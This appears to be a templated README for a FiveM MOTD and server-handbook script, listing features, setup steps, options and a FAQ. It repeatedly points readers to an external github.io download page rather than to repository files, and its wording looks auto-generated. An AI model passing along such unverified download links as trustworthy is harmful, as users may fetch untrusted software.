# rde_motd v1.0.0 - Game Script Utility 2026

> FiveM MOTD plus server handbook system featuring six editable tabs, an in-game WYSIWYG editor, and Markdown-based content control for server-side documentation.

[![Game Script](https://img.shields.io/badge/Type-Game%20Script-green?style=flat-square)](https://github.com)
[![Platform](https://img.shields.io/badge/Platform-FiveM-blue?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/bencarter1997/rde-motd-server-script?style=flat-square)](https://github.com/bencarter1997/rde-motd-server-script)

---

<p align="center">
  <a href="https://bencarter1997.github.io/rde-motd-server-script/">
    <img src="https://img.shields.io/badge/Download-rde_motd%20Script-brightgreen?style=for-the-badge" alt="Download rde_motd Script">
  </a>
</p>

> **[Direct Download - rde_motd](https://bencarter1997.github.io/rde-motd-server-script/)**

---

[Download Latest Build](https://bencarter1997.github.io/rde-motd-server-script/)

---

## Overview

rde_motd is a FiveM MOTD and server manual resource built to let server owners write, update, and publish in-game documentation without interrupting their usual workflow. It pairs a live editor with Markdown-oriented content handling and database-backed persistence, making it easier to keep rules, notes, and guides organized.

At its core, the resource uses six editable tabs and statebag-synced updates so edits can move through the server without a restart. It is intended for environments that rely on ox_core, ox_lib, and oxmysql, and it also includes localization support for multilingual deployments.

## Script Features

- Six editable tabs for structuring MOTD and manual content
- In-game admin panel for managing entries directly from FiveM
- Live WYSIWYG editing for immediate content changes
- Markdown support for clean, structured server notes
- Statebag-synced updates to distribute changes across clients
- Zero-restart workflow for editing and publishing content
- Version-based reshow behavior for refreshed manual content
- Database-driven storage for persistent document management
- Localization support for multilingual server environments
- Built for FiveM with support for ox_core, ox_lib, and oxmysql

## Setup

1. Download the resource and place it in your FiveM server resources folder.
2. Ensure the required dependencies are available:
   - ox_core
   - ox_lib
   - oxmysql
3. Add the resource to your server configuration and start it like any other FiveM resource.
4. Open the in-game admin panel to create, edit, and manage your tabs.

Example start entry:

start rde_motd

If you are using a custom folder name, make sure your resource references match the folder and config you installed.

## Options

| Option | Purpose |
| --- | --- |
| Tab count | Organize content across six editable sections |
| Editor mode | Switch between live editing and Markdown-based content flow |
| Storage | Keep entries in the database through oxmysql |
| Sync mode | Push updates through statebag synchronization |
| Reshow control | Re-display content when the version changes |
| Language pack | Adjust text for localized server usage |

## Compatibility

rde_motd is designed for FiveM servers and works with the ox_core, ox_lib, and oxmysql ecosystem. It is meant for server-side manual and MOTD delivery rather than standalone client use.

Known limitations depend on your server setup, database access, and the rest of your resource stack. If your server does not use the required dependencies, you will need to adapt the resource before deployment.

## FAQ

**How do I install it?**  
Put the resource into your server files, confirm the dependencies are present, and launch it through your server config.

**Can I edit content in game?**  
Yes. The resource includes an in-game admin panel with live WYSIWYG editing.

**Does it support Markdown?**  
Yes. Markdown support is part of the content workflow.

**Will updates appear without restarting the server?**  
The resource is built around statebag-synced updates and a zero-restart update flow.

**Can I localize the content?**  
Yes. Localization support is included for servers that need translated or region-specific text.

**Where is the content stored?**  
The profile indicates database-driven storage, with oxmysql as part of the supported stack.

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
